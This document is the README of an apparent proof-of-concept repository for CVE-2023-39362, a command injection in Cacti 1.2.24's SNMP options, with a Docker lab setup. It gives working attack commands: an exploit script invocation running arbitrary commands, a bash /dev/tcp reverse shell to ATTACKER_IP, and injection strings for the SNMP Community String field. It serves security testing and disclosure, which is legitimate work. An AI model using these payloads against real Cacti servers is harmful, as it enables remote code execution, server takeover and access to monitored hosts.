# Command injection vulnerability in Cacti (CVE-2023-39362) - PoC

This repo is forked from this repo:
https://github.com/m3ssap0/cacti-rce-snmp-options-vulnerable-application

Cacti is an open-source operational monitoring and fault management framework, continually evolving to meet the dynamic needs of its user community.

In version 1.2.24, a potential security vulnerability marked as CVE-2023-39362 has been identified. Under specific conditions, an authenticated privileged user can exploit a flaw in the SNMP options of a `Device`, utilizing a malicious string that leads to **command injection**. This exploitation results in authenticated execution of remote code on the underlying server.

CVE: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39362](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39362)

The implications of this vulnerability are **severe**, as a malicious actor with authenticated privileges could compromise the integrity of the server hosting Cacti. This compromise could potentially serve as a gateway for unauthorized access to other hosts within the network, especially those monitored by Cacti.

This is a vulnerable application to test the exploit for the **Cacti** vulnerability (**CVE-2023-39362**).

## WARNING!

**This application contains serious security vulnerabilities. Run it at your own risk! It is recommended using a backed-up and sheltered environment (such as a VM with a recent snapshot and host-only networking). Do not upload this application to any Internet facing servers, as they will be compromised.**

## Disclaimer
I do not take responsibility for the way in which any one uses this application. The only purpose of this application is to be a test scenario for the CVE-2023-39362 exploit and it should not be used maliciously. If your server is compromised via an installation of this application it is not my responsibility, it is the responsibility of the person(s) who uploaded and installed it.**

## Usage

### 1. Set up the environment
Here the steps to **setup** the environment:
1. Launch `docker compose up -d` to start composition.
2. You can finalize the steps by browsing to [http://127.0.0.1/cacti](http://127.0.0.1/cacti) to start the Cacti initialization wizard. If you get an error referring to the database, just wait a little bit and refresh the page.
3. Default credentials are `admin`/`admin`.
4. Press "*Next*" to all the buttons during the wizard, choosing options accordingly. All the defaults should be fine and all the mandatory prerequisites should be satisfied.
5. After the installation, login as the `admin`.
6. Go to "*Console*" > "*Configuration*" > "*User*".
7. Click on the `guest` user.
8. "*Enable*" it, set a password, disable the "*Must Change Password at Next Login*" if you want.
9. Click on the "*Save*" button.
10. Go to the "*Permissions*" section.
11. Under "*General Administration*", enable "*Console Access*" and "*Sites/Devices/Data*".
12. Click on the "*Save*" button.
13. Logout and re-login as `guest` to try the exploit.

The official installation guide of Cacti can be found [here](https://docs.cacti.net/README.md#cacti-installation).

To **teardown** the environment use `docker compose down` command.

### 2. Run the exploit script

(This is only one possible path for exploitation )

Run command on the remote server:
```bash
python3 exploit.py --url http://localhost -u guest -p Sup3rS3cr3tPassword.1234 --cmd touch /tmp/proof
```

Opening a reverse shell:
```bash
nc -lvnp 4242

python3 exploit.py --url http://localhost -u guest -p Sup3rS3cr3tPassword.1234 --cmd 'bash -c "exec bash -i &>/dev/tcp/ATTACKER_IP/PORT <&1"'
```

### 3. Manual exploitation
1. Go to "*Console*" > "*Create*" > "*New Device*".
2. Create a Device that supports SNMP version 1 or 2.
3. Ensure that the Device has Graphs with one or more templates of:
    * "*Net-SNMP - Combined SCSI Disk Bytes*"
    * "*Net-SNMP - Combined SCSI Disk I/O*"
    * (Creating the Device from the template "*Net-SNMP Device*" will satisfy the Graphs prerequisite)
4. In the "*SNMP Options*", for the "*SNMP Community String*" field, use a value like this: `public\' ; touch /tmp/proof ; \'`.
5. Click the "*Create*" button.
6. Check under `/tmp` the presence of the created file.

To obtain a reverse shell, a payload like the following can be used.
```
public\' ; bash -c "exec bash -i &>/dev/tcp/<host>/<port> <&1" ; \'
```

## Root cause

A detailed root cause of the vulnerability is available in the [original security advisory](https://github.com/Cacti/cacti/security/advisories/GHSA-g6ff-58cj-x3cp) or on the [original author's blog post](https://m3ssap0.github.io/articles/cacti_authenticated_command_injection_snmp.html).

## Authors

* **Antonio Francesco Sardella** - *vulnerability reporter* - [m3ssap0](https://github.com/m3ssap0)
* **Akos Jakab** - *automate the exploitation via a Python script* - [jakabakos](https://github.com/jakabakos)

## License

This project is licensed under the Unlicense - see the **LICENSE** file for details.
